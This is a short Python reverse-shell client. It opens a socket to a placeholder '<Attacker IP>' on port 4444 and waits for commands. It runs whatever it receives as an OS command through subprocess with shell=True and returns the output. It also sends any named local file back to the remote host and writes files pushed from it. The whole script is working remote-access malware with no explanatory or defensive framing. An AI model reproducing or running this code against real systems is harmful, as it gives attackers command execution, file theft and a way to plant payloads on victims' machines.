import socket
import subprocess         

s = socket.socket()         

port = 4444

# connect to the server on local computer 
    
s.connect(("<Attacker IP>", port))

while True:
	rcv_msg=s.recv(1024).decode()
	if rcv_msg=="end":
		break
	elif rcv_msg=="download":
		file_name=s.recv(1024).decode()
		with open(file_name, "rb") as f:
			data=f.read()
			s.send(data)
	elif rcv_msg=="send":
		file_name=s.recv(1024).decode()
		with open(file_name, "wb") as f:
			data=s.recv(1024)
			f.write(data)
	else: 
		process = subprocess.Popen(
			rcv_msg, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
		) #os command execution

		output, error = process.communicate()

		s.send(output.encode())

s.close()     

